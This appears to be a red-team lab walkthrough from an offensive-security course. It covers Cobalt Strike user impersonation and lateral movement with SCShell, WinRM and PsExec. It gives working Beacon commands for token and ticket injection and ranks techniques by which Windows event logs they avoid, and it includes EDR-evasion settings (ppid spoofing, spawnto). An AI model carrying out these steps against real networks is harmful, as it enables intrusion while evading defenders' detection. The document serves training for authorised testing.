# Lateral Movement Lab

>The objective of this lab is to impersonate a user and move laterally using SCShell.

===

1. Launch Cobalt Strike and connect to the team server.

## User Impersonation

1. Impersonate the *rsteel* user. [User Impersonate Lab](/labs/User-Impersonation-lab.md)  

⚠️ Use Credential Access and User Impersonation method to impersonate *rsteel*.  Use previous knowledge.  

## Lateral Movement

1. Load the SCShell Aggressor script.
    1. Go to **Cobalt Strike > Script Manager**.
    2. Click **Load**.
    3. Select *C:\Tools\SCShell\CS-BOF\scshell.cna*.

1. SCShell uses the service binary payload, so make sure to set the spawnto first.
    1. `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`

1. Move laterally to *lon-ws-1*.
  1. `jump scshell64 lon-ws-1 smb`
  
⚠️ A new SYSTEM Beacon should appear but you may also see an error message like:
    <pre>Advapi32$StartServiceA failed to start the service. 1056</pre>
    SCshell does not attempt to stop the service first (it assumes it's already stopped). In this case, just wait a few minutes and try again.

⚠️ In this lab, you have learned how to chain credential access, user impersonation, and a lateral movement technique together.

---

## OPSEC Warnings & Exam-Day Notes

### Lateral Movement Preference Order — Exam Day

Always attempt in this order — stop at the first that works:

```
1. jump winrm64    OPSEC-🟢SAFE    — no service, no Event 7045, injects into wsmprovhost.exe
2. jump scshell64  OPSEC-🟠CAUTION — modifies existing service path, Event 7040, no 7045
3. remote-exec wmi OPSEC-🟠CAUTION — no service, WMI process visible in Event 4688
4. jump psexec64   OPSEC-🔴UNSAFE  — creates new service, Event 7045 — explicit OPSEC deduction
```

Test WinRM reachability before attempting:
```cs
beacon> powerpick Test-WSMan <target>
```

---

### WinRM Beacon — No TGT Cached on Target

When you land a beacon via `jump winrm64`, the beacon on the target host has a
**Type 3 network logon token** — non-interactive, non-forwardable. This means:

- `krb_triage` will show **service tickets only** (e.g. `HTTP/lon-ws-1`, `lon-ws-1$`) — no `krbtgt` TGT
- `ldapsearch` against the DC will return **0 results** — token cannot authenticate onward
- Any technique requiring Kerberos delegation will fail

**Fix — inject credentials into the beacon after lateral move:**
```cs
// From the new beacon on the remote host:
beacon> make_token CONTOSO\rsteel <password>     // OPSEC-🟠CAUTION — Event 4648
// OR inject a previously dumped TGT:
beacon> kerberos_ticket_use C:\path\to\rsteel.kirbi   // OPSEC-🟢SAFE — no logon event
```

---

### Set Beacon Context Immediately After Lateral Move

After every lateral move to a new host, before running any fork & run commands:

```cs
beacon> sleep 3 20
beacon> ps
beacon> ppid <svchost.exe PID>                      // no explorer.exe on non-interactive sessions
beacon> spawnto x64 %windir%\sysnative\werfault.exe
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe   // for service payloads
```

---

### EDR Stack Present in CRTO Lab Environment

Confirmed running on workstations in the lab:

| Process | Role |
|---------|------|
| `elastic-agent.exe` | Elastic EDR agent |
| `elastic-endpoint.exe` | Elastic endpoint protection |
| `Sysmon64.exe` | Process/network/pipe telemetry |
| `MsMpEng.exe` | Windows Defender |
| `NisSrv.exe` | Defender Network Inspection |

Every process spawn, named pipe, and network connection is logged. `ppid` + `spawnto` +
custom `post-ex.pipename` in the malleable profile are **required**, not optional.
